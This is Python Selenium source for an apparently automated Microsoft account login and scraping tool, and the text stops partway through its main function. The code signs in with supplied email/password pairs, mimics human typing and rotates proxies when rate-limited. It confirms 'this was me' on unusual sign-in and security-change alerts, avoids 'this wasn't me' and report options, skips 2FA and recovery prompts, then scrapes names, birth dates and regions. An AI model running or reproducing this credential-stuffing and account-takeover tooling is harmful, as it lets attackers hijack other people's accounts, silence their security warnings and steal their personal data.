from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException
import time
import random
import pycountry
from automation.driver import create_driver, mark_driver_success, mark_driver_fail
from automation.checker import run_all_checks

try:
    from automation import ratelimit
except Exception:
    class ratelimit:
        @staticmethod
        def wait_turn(label="login"):
            return None

        @staticmethod
        def trip(seconds=None):
            return 0

all_countries = {country.name for country in pycountry.countries}
MAX_PROXY_RETRIES = 3

SCREEN_JS = r"""
const mode = arguments[0];
const wanted = arguments[1] || [];
function vis(el) {
  if (!el) return false;
  const r = el.getBoundingClientRect();
  if (r.width < 3 || r.height < 3) return false;
  if (r.bottom < 0 || r.top > (window.innerHeight || 900) + 40) return false;
  const st = window.getComputedStyle(el);
  if (!st || st.display === 'none' || st.visibility === 'hidden' || Number(st.opacity) === 0) return false;
  if (el.disabled) return false;
  return true;
}
function ownText(el) {
  let t = (el.getAttribute('aria-label') || el.value || el.getAttribute('title') || el.getAttribute('data-value') || '') + '';
  for (const n of el.childNodes) {
    if (n.nodeType === 3) t += ' ' + n.textContent;
  }
  t = t.replace(/\s+/g, ' ').trim();
  if (t) return t;
  return ((el.innerText || el.textContent || '') + '').replace(/\s+/g, ' ').trim();
}
function fire(el) {
  try {
    if (el.tagName === 'INPUT' && (el.type === 'radio' || el.type === 'checkbox')) {
      el.checked = true;
      try { el.dispatchEvent(new Event('input', {bubbles:true})); } catch (e) {}
      try { el.dispatchEvent(new Event('change', {bubbles:true})); } catch (e) {}
    }
  } catch (e) {}
  el.scrollIntoView({block:'center', inline:'center'});
  try { el.focus(); } catch (e) {}
  const r = el.getBoundingClientRect();
  const x = r.x + r.width/2, y = r.y + r.height/2;
  const o = {bubbles:true, cancelable:true, view:window, clientX:x, clientY:y, button:0, buttons:1};
  for (const type of ['pointerover','mouseover','pointerdown','mousedown','pointerup','mouseup','click']) {
    try { el.dispatchEvent(new MouseEvent(type, o)); } catch (e) {}
  }
  try { el.click(); } catch (e) {}
}
const NEVER = [
  'passkey','pass key','fido','windows hello','security key','fingerprint',
  'create a passkey','set up a passkey','save a passkey',
  'send a code','send code','email code','text me','sms','otp','resend',
  'forgot','reset your password','let us know','cancel this request',
  'this was not me','this wasn','report this','secure your account'
];
const PASS_OK = [
  'use your password','use a password','use my password','sign in with a password',
  'sign in with password','sign in using a password','password instead',
  'enter your password','use password'
];
const PICK_OK = [
  'other ways to sign in','sign in another way','sign-in options','signin options',
  'use a different method','more choices','other ways','another way'
];
const SKIP_OK = ['skip for now','skip','not now','maybe later','no thanks','close'];
const NEXT_OK = ['next','continue','sign in','submit','looks good','got it','ok','okay','accept'];

const headingEl = document.querySelector('h1, h2, [role="heading"], #loginHeader, #iPageTitle, .ext-title, [data-testid="title"]');
const heading = headingEl ? ownText(headingEl) : '';
let body = '';
try { body = (document.body.innerText || '').replace(/\s+/g, ' ').trim().slice(0, 600); } catch (e) {}

const nodes = Array.from(document.querySelectorAll(
  'button, a, [role="button"], [role="radio"], [role="option"], [role="checkbox"], ' +
  'input, label, [data-testid="secondaryButton"], [data-testid="primaryButton"], [data-testid="tile"], ' +
  '#iShowSkip, #iLandingViewAction, #iNext, #iLooksGood, #idSIButton9, #idBtn_Skip, #idBtn_Accept, #iFinish, ' +
  '#iProof0, #iProof1, #iProofAction, #idDiv_SAOTCS_Proofs'
));
const rows = [];
const seen = new Set();
for (const el of nodes) {
  if (!vis(el) && !(el.tagName === 'INPUT' && (el.type === 'radio' || el.type === 'checkbox' || el.type === 'submit'))) continue;
  if (el.tagName === 'INPUT' && el.type === 'hidden') continue;
  const own = ownText(el);
  if (!own || own.length > 120) continue;
  const key = el.tagName + ':' + own + ':' + (el.id||'');
  if (seen.has(key)) continue;
  seen.add(key);
  rows.push({
    el, own,
    low: own.toLowerCase(),
    tag: el.tagName,
    type: (el.type || '').toLowerCase(),
    testid: el.getAttribute('data-testid') || '',
    id: el.id || ''
  });
}
const dump = rows.map(r => r.tag + (r.type ? '['+r.type+']' : '') + ':' + r.own + (r.id ? '#'+r.id : ''));

function never(t) {
  return NEVER.some(b => t.includes(b));
}
function pick(fn) {
  let best = null, bestS = -1;
  for (const r of rows) {
    const s = fn(r);
    if (s > bestS) { bestS = s; best = r; }
  }
  if (!best || bestS < 0) return {clicked: null, shown: dump, heading: heading, body: body};
  fire(best.el);
  return {clicked: best.tag + ':' + best.own, shown: dump, heading: heading, body: body};
}
function scorePassword(r) {
  const t = r.low;
  if (never(t) || t.includes('passkey')) return -1;
  if (t.includes('code') && !t.includes('password')) return -1;
  let s = -1;
  for (const p of PASS_OK) {
    if (t === p) s = Math.max(s, 1000);
    else if (t.includes(p)) s = Math.max(s, 850);
  }
  if (s < 0 && t === 'password') s = 700;
  if (s < 0 && t.includes('password') && t.length <= 28) s = 500;
  if (s > 0) {
    if (r.tag === 'BUTTON') s += 120;
    if (r.testid === 'secondaryButton') s += 80;
    s -= Math.min(60, t.length);
  }
  return s;
}
function scorePicker(r) {
  const t = r.low;
  if (never(t) || t.includes('passkey') || (t.includes('code') && !t.includes('password'))) return -1;
  for (const p of PICK_OK) {
    if (t === p || t.includes(p)) return 100 + (r.tag === 'BUTTON' ? 50 : 0);
  }
  return -1;
}
function scoreSkip(r) {
  const t = r.low;
  if (never(t)) return -1;
  for (const p of SKIP_OK) { if (t === p || t.includes(p)) return 80 + (t === p ? 20 : 0); }
  if (r.id === 'iShowSkip' || r.id === 'idBtn_Skip') return 90;
  return -1;
}
function scoreYes(r) {
  const t = r.low;
  if (never(t)) return -1;
  if (t === 'no' || t.startsWith('no,') || t.startsWith('no ')) return -1;
  if (t === 'yes' || t === 'yes, i did' || t === 'yes i did' || t === 'yes, this was me' || t === 'this was me' || t === 'this was you') return 100;
  if (t.startsWith('yes')) return 80;
  return -1;
}
function scoreNext(r) {
  const t = r.low;
  if (never(t) || t.includes('passkey') || (t.includes('code') && !t.includes('password')) || t.includes('send')) return -1;
  if (r.testid === 'primaryButton') return 200;
  if (['idSIButton9','iLandingViewAction','iNext','iLooksGood','iFinish','idBtn_Accept','iProofAction'].includes(r.id)) return 180;
  for (const p of NEXT_OK) { if (t === p) return 150; }
  return -1;
}
function scoreWanted(r) {
  const t = r.low;
  if (never(t)) return -1;
  if (t === 'no' || t.startsWith('no,') || t.startsWith('no ')) {
    const allowNo = wanted.some(w => (w||'').toLowerCase() === 'no');
    if (!allowNo) return -1;
  }
  for (let i = 0; i < wanted.length; i++) {
    const w = (wanted[i] || '').toLowerCase();
    if (!w) continue;
    if (t === w) return 2000 - i * 10;
    if (t.startsWith(w + ',') || t.startsWith(w + ' ')) return 1500 - i * 10;
    if (t.includes(w) && t.length < 48) return 800 - i * 10;
  }
  return -1;
}

if (mode === 'dump') return {clicked: null, shown: dump, heading: heading, body: body};
if (mode === 'password') return pick(scorePassword);
if (mode === 'picker') return pick(scorePicker);
if (mode === 'skip') return pick(scoreSkip);
if (mode === 'yes') return pick(scoreYes);
if (mode === 'next') return pick(scoreNext);
if (mode === 'wanted') return pick(scoreWanted);
return {clicked: null, shown: dump, heading: heading, body: body};
"""

FORCE_CLICK_JS = r"""
const texts = (arguments[0] || []).map(t => (t||'').toLowerCase());
function vis(el) {
  if (!el) return false;
  const r = el.getBoundingClientRect();
  if (r.width < 2 || r.height < 2) return false;
  const st = window.getComputedStyle(el);
  if (!st || st.display === 'none' || st.visibility === 'hidden') return false;
  return true;
}
function txt(el) {
  return ((el.getAttribute('aria-label') || el.value || el.innerText || el.textContent || '') + '')
    .replace(/\s+/g, ' ').trim().toLowerCase();
}
function fire(el) {
  try {
    if (el.tagName === 'INPUT' && (el.type === 'radio' || el.type === 'checkbox')) {
      el.checked = true;
      el.dispatchEvent(new Event('change', {bubbles:true}));
    }
  } catch (e) {}
  try { el.disabled = false; } catch (e) {}
  el.scrollIntoView({block:'center'});
  try { el.click(); } catch (e) {}
  const r = el.getBoundingClientRect();
  const o = {bubbles:true, cancelable:true, view:window, clientX:r.x+r.width/2, clientY:r.y+r.height/2, button:0};
  try { el.dispatchEvent(new MouseEvent('click', o)); } catch (e) {}
}
const nodes = Array.from(document.querySelectorAll(
  'button, a, [role="button"], [role="radio"], [role="option"], input, label, span, div'
));
let best = null, bestS = -1, bestT = '';
for (const el of nodes) {
  if (!vis(el) && !(el.tagName === 'INPUT')) continue;
  const t = txt(el);
  if (!t || t.length > 80) continue;
  if (t.includes('let us know') || t.includes('cancel this request') || t.includes('passkey') || t.includes('send a code')) continue;
  for (let i = 0; i < texts.length; i++) {
    const w = texts[i];
    if (!w) continue;
    let s = -1;
    if (t === w) s = 3000 - i*10;
    else if (t.startsWith(w)) s = 2000 - i*10;
    else if (t.includes(w) && t.length < 50) s = 1000 - i*10;
    if (s > bestS) { bestS = s; best = el; bestT = t; }
  }
}
if (!best) return null;
fire(best);
return best.tagName + ':' + bestT;
"""

PROFILE_JS = r"""
function vis(el){
  if(!el) return false;
  const r=el.getBoundingClientRect();
  if(r.width<1 && r.height<1) return false;
  const st=getComputedStyle(el);
  return st.display!=='none' && st.visibility!=='hidden' && Number(st.opacity)!==0;
}
function txt(el){ return ((el.innerText||el.textContent||'')+'').replace(/\s+/g,' ').trim(); }
const skipName=/^(your info|personal info|microsoft|account|name|full name|first name|last name|edit|save|cancel|profile|home|security|privacy|payment|overview|subscriptions|country or region|date of birth)$/i;
let name='', first='', last='', dob='', region='';
const body=(document.body && document.body.innerText || '').replace(/\s+/g,' ');
const html=document.documentElement.innerHTML || '';
const monthNames='January|February|March|April|May|June|July|August|September|October|November|December';

const nodes=Array.from(document.querySelectorAll('div,span,p,h1,h2,h3,dt,dd,li,label,button,a,td,th'));
const labelRe = {
  name: /^(full name|display name|name)$/i,
  first: /^(first name|given name)$/i,
  last: /^(last name|surname|family name)$/i,
  dob: /^(date of birth|birth date|birthday|born)$/i,
  region: /^(country or region|country\/region|country or area|country|region|location)$/i
};
for (let i=0;i<nodes.length;i++){
  const el=nodes[i];
  if(!vis(el)) continue;
  const t=txt(el);
  if(!t || t.length>80) continue;
  for (const [key, re] of Object.entries(labelRe)){
    if(!re.test(t)) continue;
    let val='';
    if(el.nextElementSibling) val=txt(el.nextElementSibling);
    const parent=el.parentElement;
    if(!val && parent){
      const kids=Array.from(parent.children).map(txt).filter(Boolean);
      const idx=kids.findIndex(k=>re.test(k));
      if(idx>=0 && kids[idx+1] && !re.test(kids[idx+1])) val=kids[idx+1];
    }
    if(!val && parent && parent.nextElementSibling) val=txt(parent.nextElementSibling);
    if(!val) continue;
    if(key==='name' && !skipName.test(val) && val.length>=2 && val.length<80 && !val.includes('@')) name=name||val;
    if(key==='first' && val.length>=1 && val.length<40) first=first||val;
    if(key==='last' && val.length>=1 && val.length<40) last=last||val;
    if(key==='dob') dob=dob||val;
    if(key==='region') region=region||val;
  }
}

function grab(re, n){
  const m=html.match(re);
  return m ? m[n||1] : '';
}
first = first || grab(/"firstName"\s*:\s*"([^"]+)"/);
last  = last  || grab(/"lastName"\s*:\s*"([^"]+)"/);
name  = name  || grab(/"displayName"\s*:\s*"([^"]{2,80})"/) || grab(/"fullName"\s*:\s*"([^"]{2,80})"/);
if(!name && first && last) name=(first+' '+last).trim();
dob = dob || grab(/"birthDate"\s*:\s*"([^"]+)"/) || grab(/"dateOfBirth"\s*:\s*"([^"]+)"/);
if(!dob){
  const bm=grab(/"birthMonth"\s*:\s*"?(\d{1,2})"?/);
  const bd=grab(/"birthDay"\s*:\s*"?(\d{1,2})"?/);
  const by=grab(/"birthYear"\s*:\s*"?(\d{4})"?/);
  if(bm && bd && by) dob=bm+'/'+bd+'/'+by;
}
region = region || grab(/"countryName"\s*:\s*"([^"]+)"/) || grab(/"country"\s*:\s*"([A-Z]{2})"/);

if(!dob){
  let m=body.match(new RegExp('(?:date of birth|birth date|birthday)[:\\s]+(('+monthNames+')\\s+\\d{1,2},?\\s*\\d{4}|\\d{1,2}/\\d{1,2}/\\d{4})','i'));
  if(m) dob=m[1];
}
if(!dob){
  let m=body.match(new RegExp('\\b(('+monthNames+')\\s+\\d{1,2},\\s*\\d{4})\\b','i'));
  if(m) dob=m[1];
}
if(!dob){
  let m=body.match(/\b(\d{1,2}\/\d{1,2}\/\d{4})\b/);
  if(m) dob=m[1];
}

function field(ids){
  for(const id of ids){
    const el=document.getElementById(id);
    if(!el) continue;
    const v=(el.value || txt(el) || '').trim();
    if(v) return v;
  }
  return '';
}
first = first || field(['iFirstName','FirstName','idFirstName']);
last  = last  || field(['iLastName','LastName','idLastName']);
if(!name && (first||last)) name=(first+' '+last).trim();
if(!dob){
  const bm=field(['iBirthMonth','BirthMonth']);
  const bd=field(['iBirthDay','BirthDay']);
  const by=field(['iBirthYear','BirthYear']);
  if(bm && bd && by) dob=bm+'/'+bd+'/'+by;
}
region = region || field(['iCountry','Country','iSignupCountry']);

return {name:name||'', first:first||'', last:last||'', dob:dob||'', region:region||'', sample: body.slice(0,500)};
"""


def _norm(s):
    return " ".join((s or "").lower().split())


def _is_rate_limited(driver):
    try:
        page = driver.page_source or ""
        if "Too Many Requests" in page:
            return True
        low = page.lower()
        if "unusual activity" in low or "temporarily blocked" in low:
            return True
    except Exception:
        pass
    return False


def _displayed(el):
    try:
        if not (el.is_displayed() and el.is_enabled()):
            return False
        size = el.size or {}
        return (size.get("width", 0) or 0) >= 2 and (size.get("height", 0) or 0) >= 2
    except StaleElementReferenceException:
        return False
    except Exception:
        return False


def _human_type(el, text):
    for _ in range(3):
        try:
            el.click()
            try:
                el.send_keys(Keys.CONTROL, "a")
            except Exception:
                pass
            for ch in text:
                el.send_keys(ch)
                time.sleep(random.uniform(0.012, 0.035))
            time.sleep(random.uniform(0.06, 0.12))
            return
        except StaleElementReferenceException:
            time.sleep(0.2)
            continue


def _password_box(driver):
    for by, sel in [
        (By.CSS_SELECTOR, 'input[data-testid="passwordEntry"]'),
        (By.ID, "passwordEntry"),
        (By.NAME, "passwd"),
        (By.ID, "i0118"),
        (By.CSS_SELECTOR, 'input[type="password"]'),
    ]:
        try:
            for el in driver.find_elements(by, sel):
                if not _displayed(el):
                    continue
                name = (el.get_attribute("name") or "").lower()
                eid = (el.get_attribute("id") or "").lower()
                auto = (el.get_attribute("autocomplete") or "").lower()
                if "code" in name or "code" in eid or "otp" in name or "one-time" in auto:
                    continue
                return el
        except StaleElementReferenceException:
            continue
        except Exception:
            continue
    return None


def _otp_box(driver):
    for by, sel in [
        (By.NAME, "otc"),
        (By.ID, "iOttText"),
        (By.CSS_SELECTOR, 'input[data-testid="otpEntry"]'),
        (By.CSS_SELECTOR, 'input[autocomplete="one-time-code"]'),
        (By.CSS_SELECTOR, 'input[name="otc"]'),
    ]:
        try:
            for el in driver.find_elements(by, sel):
                if _displayed(el):
                    return el
        except Exception:
            continue
    return None


def _screen(driver, mode, wanted=None):
    try:
        data = driver.execute_script(SCREEN_JS, mode, wanted or []) or {}
    except Exception as e:
        print(f"⚠️ screen({mode}): {e}")
        return None, [], "", ""
    shown = data.get("shown") or []
    clicked = data.get("clicked")
    heading = data.get("heading") or ""
    body = data.get("body") or ""
    if heading:
        print(f"📄 Heading: {heading}")
    if shown:
        print(f"👁️ Shown ({len(shown)}): {shown}")
    else:
        print("👁️ Shown: (no visible buttons)")
    if clicked:
        print(f"➡️ Clicked: {clicked}")
    else:
        print(f"➡️ Clicked: nothing  (mode={mode})")
    return clicked, shown, heading, body


def _force_click(driver, texts):
    try:
        hit = driver.execute_script(FORCE_CLICK_JS, texts)
        if hit:
            print(f"➡️ Force-clicked: {hit}")
            return True
    except Exception as e:
        print(f"⚠️ force_click js: {e}")
    for t in texts:
        xp = (
            f"//*[self::button or self::a or self::label or self::input or @role='button' or @role='radio']"
            f"[contains(translate(normalize-space(@value),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'), '{t}') "
            f"or contains(translate(normalize-space(.),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'), '{t}')]"
        )
        try:
            for el in driver.find_elements(By.XPATH, xp):
                try:
                    label = _norm(el.text or el.get_attribute("value") or el.get_attribute("aria-label") or "")
                    if any(x in label for x in ("let us know", "cancel this request", "passkey", "send a code")):
                        continue
                    driver.execute_script(
                        "arguments[0].disabled=false; arguments[0].checked=true; arguments[0].click();",
                        el,
                    )
                    print(f"➡️ XPath-clicked: {label or t}")
                    return True
                except Exception:
                    continue
        except Exception:
            continue
    return False


def _click_continue_ids(driver):
    for eid in ("idSIButton9", "iNext", "iLandingViewAction", "iProofAction", "iLooksGood", "iFinish", "idBtn_Accept"):
        try:
            el = driver.find_element(By.ID, eid)
            t = _norm(el.text or el.get_attribute("value") or "")
            if any(x in t for x in ("let us know", "cancel this request", "passkey", "send a code")):
                continue
            driver.execute_script("arguments[0].disabled=false; arguments[0].click();", el)
            print(f"➡️ Clicked id #{eid} ({t or eid})")
            return True
        except Exception:
            continue
    try:
        btn = driver.find_element(By.CSS_SELECTOR, 'button[data-testid="primaryButton"]')
        t = _norm(btn.text or "")
        if "send" not in t and "passkey" not in t:
            driver.execute_script("arguments[0].disabled=false; arguments[0].click();", btn)
            print(f"➡️ Clicked primaryButton ({t})")
            return True
    except Exception:
        pass
    return False


def _has_password_option(shown):
    if not shown:
        return False
    needles = (
        "use your password", "use a password", "use my password",
        "sign in with a password", "sign in with password",
        "password instead", "enter your password", "use password",
    )
    for item in shown:
        t = _norm(item)
        if "passkey" in t or "forgot" in t:
            continue
        if any(n in t for n in needles):
            return True
        label = t.split(":", 1)[-1].strip()
        if label == "password" or label.endswith(" password"):
            return True
    return False


def _wait_password(driver, seconds=1.8):
    end = time.time() + seconds
    while time.time() < end:
        box = _password_box(driver)
        if box:
            return box
        time.sleep(0.08)
    return None


def _email_box(driver, wait):
    for by, sel in [
        (By.ID, "usernameEntry"),
        (By.ID, "i0116"),
        (By.NAME, "loginfmt"),
        (By.CSS_SELECTOR, 'input[type="email"]'),
        (By.CSS_SELECTOR, 'input[data-testid="usernameEntry"]'),
    ]:
        try:
            el = wait.until(EC.visibility_of_element_located((by, sel)))
            if el:
                return el
        except Exception:
            continue
    raise RuntimeError("Email input not found")


def _submit_email(driver, wait, email):
    box = _email_box(driver, wait)
    _human_type(box, email)
    clicked = False
    for by, sel in [
        (By.CSS_SELECTOR, 'button[data-testid="primaryButton"]'),
        (By.ID, "idSIButton9"),
        (By.CSS_SELECTOR, 'button[type="submit"]'),
    ]:
        try:
            btn = driver.find_element(by, sel)
            t = _norm(btn.text or btn.get_attribute("value") or "")
            if _displayed(btn) and "send" not in t and "code" not in t and "passkey" not in t:
                print(f"➡️ Clicked submit: {t or sel}")
                btn.click()
                clicked = True
                break
        except StaleElementReferenceException:
            continue
        except Exception:
            continue
    if not clicked:
        try:
            box.send_keys(Keys.RETURN)
            print("➡️ Clicked submit: ENTER")
        except StaleElementReferenceException:
            pass
    print("📨 Email submitted")
    time.sleep(random.uniform(0.9, 1.4))


def _submit_password(driver, box, password):
    _human_type(box, password)
    clicked, shown, heading, body = _screen(driver, "next")
    if clicked:
        print("🔑 Password submitted")
        return
    for by, sel in [
        (By.CSS_SELECTOR, 'button[data-testid="primaryButton"]'),
        (By.ID, "idSIButton9"),
        (By.CSS_SELECTOR, 'button[type="submit"]'),
    ]:
        try:
            btn = driver.find_element(by, sel)
            t = _norm(btn.text or btn.get_attribute("value") or "")
            if not _displayed(btn):
                continue
            if any(x in t for x in ("send", "code", "passkey", "phone", "sms")):
                continue
            if _otp_box(driver):
                continue
            print(f"➡️ Clicked submit: {t or sel}")
            btn.click()
            print("🔑 Password submitted")
            return
        except StaleElementReferenceException:
            continue
        except Exception:
            continue
    try:
        box.send_keys(Keys.RETURN)
        print("🔑 Password submitted (enter)")
    except StaleElementReferenceException:
        print("🔑 Password submitted (stale - enter skipped)")


def _reach_password(driver, timeout=18):
    deadline = time.time() + timeout
    opened_picker = False
    last_try = 0.0
    last_dump = []
    saw_password_option = False

    while time.time() < deadline:
        try:
            pw = _password_box(driver)
            if pw:
                print("✅ Password input found.")
                return pw

            now = time.time()
            if now - last_try >= 0.45:
                last_try = now
                clicked, shown, heading, body = _screen(driver, "password")
                last_dump = shown or last_dump
                if _has_password_option(shown) or clicked:
                    saw_password_option = True
                if clicked:
                    pw = _wait_password(driver, 1.8)
                    if pw:
                        print("✅ Password input found.")
                        return pw

                if not opened_picker:
                    pick, shown2, _, _ = _screen(driver, "picker")
                    last_dump = shown2 or last_dump
                    if pick:
                        opened_picker = True
                        time.sleep(0.35)
                        continue
        except StaleElementReferenceException:
            time.sleep(0.15)
        except Exception as e:
            print(f"⚠️ reach_password: {e}")
        time.sleep(0.1)

    print("👁️ Final screen dump:")
    _, last_dump, _, _ = _screen(driver, "dump")
    pw = _password_box(driver)
    if pw:
        print("✅ Password input found.")
        return pw
    if not saw_password_option and not _has_password_option(last_dump):
        print("❌ no password options")
        return "NO_PASSWORD_OPTIONS"
    print("❌ Password option seen but field never opened")
    return None


def _logged_in_url(url):
    u = (url or "").lower()
    if not u:
        return False
    if any(x in u for x in (
        "login.live.com", "login.microsoft.com", "login.microsoftonline.com",
        "/identity", "/proofs", "/interrupt", "/abuse", "/recover",
        "/passkey", "/fido",
    )):
        return False
    if any(x in u for x in (
        "account.microsoft.com", "account.live.com",
        "skype.com", "xbox.com", "outlook.live.com",
        "privacynotice",
    )):
        return True
    return False


def _is_security_change_page(heading, body, src):
    blob = _norm((heading or "") + " " + (body or "") + " " + (src or "")[:2000])
    return any(x in blob for x in (
        "did you request",
        "did you recently request",
        "request a security",
        "security info change",
        "security change",
        "change to your security",
        "replace your security",
        "security info replacement",
        "did you make a change",
        "continue using your account",
        "security info will be replaced",
        "still pending",
        "you can't access this site",
        "you cannot access this site",
    ))


def _clear_security_change(driver, max_s=22.0):
    print("🛡️ Security-change interrupt — Yes first, then Continue")
    end = time.time() + max_s
    picked_yes = False
    last_h = ""
    same = 0

    while time.time() < end:
        try:
            url = ""
            src = ""
            try:
                url = driver.current_url or ""
            except Exception:
                pass
            try:
                src = (driver.page_source or "").lower()
            except Exception:
                pass

            if _logged_in_url(url):
                print(f"✅ Left security interrupt -> {url[:90]}")
                return True

            _, shown, heading, body = _screen(driver, "dump")
            blob = _norm((heading or "") + " " + (body or "") + " " + src[:1500])
            labs = " ".join(_norm(x) for x in (shown or []))

            if heading == last_h:
                same += 1
            else:
                same = 0
                last_h = heading
                picked_yes = False

            if not _is_security_change_page(heading, body, src) and "continue" not in labs and "yes" not in labs:
                if _logged_in_url(url):
                    return True
                print("🛡️ No longer on security-change page")
                return True

            has_yes = any(
                x in labs for x in (
                    "yes, this was me", "yes this was me", "yes, i did", "yes i did",
                    ":yes", "button:yes", "label:yes", "radio:yes",
                )
            ) or "yes" in labs

            if has_yes and not picked_yes:
                print("🎯 Step 1: select YES (radio/tile)")
                ok_yes = _force_click(driver, [
                    "yes, this was me", "yes this was me", "yes, i did", "yes i did",
                    "this was me", "yes",
                ])
                if not ok_yes:
                    ok_yes = bool(_screen(driver, "wanted", [
                        "yes, this was me", "yes this was me", "yes, i did", "yes i did",
                        "this was me", "yes",
                    ])[0])
                if ok_yes:
                    picked_yes = True
                    time.sleep(0.8)
                    continue

            print("🎯 Step 2: click CONTINUE / NEXT")
            ok_c = _force_click(driver, ["continue", "next", "looks good", "got it", "ok"])
            if not ok_c:
                ok_c = _click_continue_ids(driver)
            if not ok_c:
                ok_c = bool(_screen(driver, "wanted", ["continue", "next", "looks good"])[0])
            if not ok_c:
                ok_c = bool(_screen(driver, "next")[0])

            if ok_c:
                time.sleep(1.0)
                continue

            if same >= 3:
                print("⚠️ Repeat window — brute Continue ids")
                _click_continue_ids(driver)
                _force_click(driver, ["continue", "next"])
                same = 0
                time.sleep(0.8)

        except StaleElementReferenceException:
            time.sleep(0.2)
        except Exception as e:
            print(f"⚠️ security-change: {e}")
        time.sleep(0.3)

    print("⚠️ Security-change handler timed out")
    return False


def _decide_after_password(heading, body, shown, url, src):
    t = _norm((heading or "") + " " + (body or ""))
    blob = t + " " + _norm(url or "") + " " + _norm(src or "")[:1500]
    print(f"🧠 Window: {(heading or blob[:70])!r}")

    if _is_security_change_page(heading, body, src):
        return ["__SECURITY_CHANGE__"]

    if "stay signed in" in blob:
        return ["yes", "next"]

    if any(x in blob for x in ("create a passkey", "save a passkey", "set up a passkey", "windows hello", "use a passkey")):
        return ["skip for now", "skip", "not now", "no thanks", "cancel", "close"]

    if any(x in blob for x in (
        "was this you", "this was you", "this was me", "we noticed",
        "unusual sign", "new location", "new device", "trying to sign in",
        "recently signed in", "do you recognize",
    )):
        return ["yes", "this was me", "this was you", "continue", "next"]

    if any(x in blob for x in (
        "protect your account", "keep your account", "help us protect",
        "help us secure", "let's protect", "lets protect",
        "add a phone", "add security", "update your security",
        "more information", "verify your identity", "confirm your identity",
        "add a recovery", "add a way", "proofs",
    )):
        return [
            "skip for now", "skip", "not now", "maybe later",
            "i don't have any of these", "i dont have any of these",
            "next", "continue",
        ]

    if "looks good" in blob:
        return ["looks good", "yes", "next"]

    if any(x in blob for x in ("cookie", "privacy notice", "accept cookies")):
        return ["accept", "yes", "ok", "got it"]

    if any(x in blob for x in ("authenticator app", "get the microsoft authenticator", "approve a sign-in")):
        return ["skip for now", "skip", "i don't have any of these", "use a different method", "cancel"]

    return ["skip for now", "skip", "next", "continue", "yes", "looks good", "got it", "ok"]


def _handle_after_password(driver, max_s=24.0):
    print("🪟 Handling post-password Microsoft windows...")
    end = time.time() + max_s
    last_heading = ""
    same = 0

    while time.time() < end:
        try:
            url = ""
            src = ""
            try:
                url = driver.current_url or ""
            except Exception:
                pass
            try:
                src = (driver.page_source or "").lower()
            except Exception:
                pass

            if _otp_box(driver):
                print("🚫 OTP window after password - switching to password")
                _screen(driver, "picker")
                time.sleep(0.2)
                _screen(driver, "password")
                time.sleep(0.3)
                if _otp_box(driver):
                    print("🚫 Real 2FA after password")
                    return "2FA"
                continue

            if _logged_in_url(url):
                print(f"✅ Left login flow -> {url[:90]}")
                break

            clicked, shown, heading, body = _screen(driver, "dump")

            if heading == last_heading:
                same += 1
            else:
                same = 0
                last_heading = heading

            wanted = _decide_after_password(heading, body, shown, url, src)
            print(f"🎯 Want click: {wanted[:6]}")

            if wanted and wanted[0] == "__SECURITY_CHANGE__":
                _clear_security_change(driver, max_s=18.0)
                time.sleep(0.4)
                continue

            hit, _, _, _ = _screen(driver, "wanted", wanted)
            if hit:
                time.sleep(0.7)
                continue

            if _click_continue_ids(driver):
                time.sleep(0.7)
                continue

            if same >= 2:
                print("⚠️ Same window repeating - Next then Skip")
                _force_click(driver, ["continue", "next", "yes"])
                _click_continue_ids(driver)
                _screen(driver, "next")
                time.sleep(0.3)
                _screen(driver, "skip")
                same = 0
                time.sleep(0.5)

        except StaleElementReferenceException:
            time.sleep(0.2)
        except Exception as e:
            print(f"⚠️ post-password: {e}")
        time.sleep(0.25)

    try:
        print(f"🪟 Post-password done. URL={driver.current_url}")
    except Exception:
        pass
    return None


def _missing(val, suffix="not found"):
    s = (val or "").strip()
    return (not s) or s.lower().endswith(suffix)


def _merge_profile(dst, extra):
    if not extra:
        return dst
    mapping = {
        "name": "name",
        "first_name": "first",
        "last_name": "last",
        "dob": "dob",
        "region": "region",
    }
    for dst_key, src_key in mapping.items():
        val = (extra.get(src_key) or extra.get(dst_key) or "").strip()
        cur = (dst.get(dst_key) or "").strip()
        if val and (not cur or "not found" in cur.lower()):
            dst[dst_key] = val
    return dst


def _extract_profile(driver):
    """Read name / first / last / DOB / region off Microsoft profile pages."""
    out = {
        "name": "Name not found",
        "first_name": "",
        "last_name": "",
        "dob": "DOB not found",
        "region": "Region not found",
    }
    urls = [
        "https://account.microsoft.com/profile",
        "https://account.microsoft.com/profile/edit-name",
        "https://account.live.com/names/manage",
        "https://account.live.com/EditProfile.aspx",
        "https://account.microsoft.com/billing/address",
    ]
    for url in urls:
        try:
            print(f"🌐 Profile scrape: {url}")
            driver.get(url)
            time.sleep(1.4)
            try:
                _handle_after_password(driver, max_s=6.0)
            except Exception:
                pass
            time.sleep(0.4)
            data = {}
            try:
                data = driver.execute_script(PROFILE_JS) or {}
            except Exception as e:
                print(f"⚠️ PROFILE_JS: {e}")
                data = {}
            print(f"   js -> name={data.get('name')!r} first={data.get('first')!r} last={data.get('last')!r} dob={data.get('dob')!r} region={data.get('region')!r}")
            if data.get("sample"):
                print(f"   sample: {str(data.get('sample'))[:220]}")
            _merge_profile(out, data)

            region = out.get("region") or ""
            if len(region) == 2:
                try:
                    c = pycountry.countries.get(alpha_2=region.upper())
                    if c:
                        out["region"] = c.name
                except Exception:
                    pass
            if _missing(out.get("region"), "not found"):
                body = ""
                try:
                    body = driver.find_element(By.TAG_NAME, "body").text or ""
                except Exception:
                    pass
                for country in all_countries:
                    if country and country in body:
                        out["region"] = country
                        break

            if (not _missing(out.get("name"), "not found")
                    and not _missing(out.get("dob"), "not found")):
                break
        except Exception as e:
            print(f"⚠️ profile url {url}: {e}")
            continue

    name = out.get("name") or ""
    if name and "not found" not in name.lower() and not out.get("first_name"):
        bits = name.split()
        out["first_name"] = bits[0]
        out["last_name"] = " ".join(bits[1:]) if len(bits) > 1 else bits[0]
    print(f"🔹 Final - name: {out.get('name')}, dob: {out.get('dob')}, region: {out.get('region')}")
    return out


def scrape_account_info(email: str, password: str) -> dict:
    try:
        ratelimit.wait_turn("login")
    except Exception:
        pass
    last_error = None
    for attempt in range(MAX_PROXY_RETRIES + 1):
        use_proxy = attempt > 0
        force_rotate = attempt > 1
        if attempt > 0:
            try:
                left = ratelimit.trip()
            except Exception:
                left = 0
